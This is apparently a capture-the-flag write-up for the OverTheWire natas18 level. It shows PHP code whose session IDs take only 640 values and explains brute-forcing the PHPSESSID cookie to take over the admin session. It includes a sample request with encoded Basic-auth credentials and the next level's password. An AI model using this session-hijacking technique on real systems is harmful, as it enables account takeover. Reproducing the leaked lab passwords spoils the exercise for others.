This one is related to PHP sessions. We also have access to the source code but I don't copy it here in its entirety because it's too long. Here are below the interesting parts:
```
// When a session is created on the server, a random ID is assigned.
// There are only 640 possible values.
$maxid = 640;

function createID($user) {
    global $maxid;
    return rand(1, $maxid);
}

[... Truncated ...]

// Essentially this function checks whether
// a session ID is passed in the Cookie header,
// and if its is valid.
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}

[... Truncated ...]

// We want our session to have
// a variable "admin" set to 1.
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}

[... Truncated ...]

// If no session ID was passed to the server, or
// if it is invalid, a new session ID is generated
// and a new session is created.
$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}
```

I initially tried to find a way to create a session on the server where the "admin" variable would be set to 1. But it is actually way easier, we just have to find the existing session for the admin user.

To do that we just have to send HTTP GET requests to http://natas18.natas.labs.overthewire.org/, passing differeng PHPSESSID values in the Cookie header:
```
GET /index.php HTTP/1.1
Host: natas18.natas.labs.overthewire.org
Authorization: Basic bmF0YXMxODo4TkVEVVV4ZzhrRmdQVjg0dUx3dlprR242b2tKUTZhcQ==
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=119
Connection: close
```

Eventually we find the right session, and we get the credentials we want.

Password for the next level is `tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr`.
